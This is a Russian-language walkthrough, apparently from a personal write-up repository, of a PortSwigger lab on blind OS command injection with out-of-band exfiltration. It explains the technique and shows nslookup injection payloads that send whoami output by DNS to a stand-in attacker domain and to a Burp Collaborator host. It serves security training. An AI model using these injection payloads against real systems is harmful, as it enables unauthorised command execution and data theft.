# Blind OS command injection with out-of-band data exfiltration

## Theory

Можно использовать введенную команду, которая инициирует внешнее сетевое взаимодействие с системой, которой вы управляете, используя методы OAST. Например:
```
& nslookup kgji2ohoyw.web-attacker.com &
```

Эта полезная нагрузка использует команду nslookup для поиска DNS для указанного домена. Злоумышленник может отслеживать выполнение указанного поиска и, таким образом, обнаруживать, что команда была успешно внедрена.

Внеполосный канал также обеспечивает простой способ эксфильтрации вывода внедренных команд:
```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

Это приведет к поиску в DNS злоумышленника, содержащему результат команды whoami:
```
wwwuser.kgji2ohoyw.web-attacker.com
```

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Command_injection/Blind_OS_command_injection_with_out-of-band_data_exfiltration/assets/1.png)

Перейдем на страницу "Submit feedback".

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Command_injection/Blind_OS_command_injection_with_out-of-band_data_exfiltration/assets/2.png)

Заполним поля для ввода случайными данными и перехватим запрос.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Command_injection/Blind_OS_command_injection_with_out-of-band_data_exfiltration/assets/3.png)

Откроем Burp Collaborator.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Command_injection/Blind_OS_command_injection_with_out-of-band_data_exfiltration/assets/4.png)

Скопируем DNS кнопкой "Copy to clipboard" и модифицируем запрос.
```
email=111%40gmail.com||nslookup+`whoami`.l3po4oxu63uw62hcyza2ff684zaqyf.burpcollaborator.net||
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Command_injection/Blind_OS_command_injection_with_out-of-band_data_exfiltration/assets/5.png)

Отправив запрос, перейдем к окну Burp Collaborator и нажмем кнопку "Pull now" для обновления. Заметим, что мы получили ответ от нашего модифицированного запроса.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Command_injection/Blind_OS_command_injection_with_out-of-band_data_exfiltration/assets/6.png)

Копируем имя пользователя. На главной странице найдем кнопку "Submit solution".

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Command_injection/Blind_OS_command_injection_with_out-of-band_data_exfiltration/assets/7.png)

Нам открывается панель для ввода ответа. Вставляем имя пользователя и отправляем.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Command_injection/Blind_OS_command_injection_with_out-of-band_data_exfiltration/assets/8.png)

Получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Command_injection/Blind_OS_command_injection_with_out-of-band_data_exfiltration/assets/9.png)
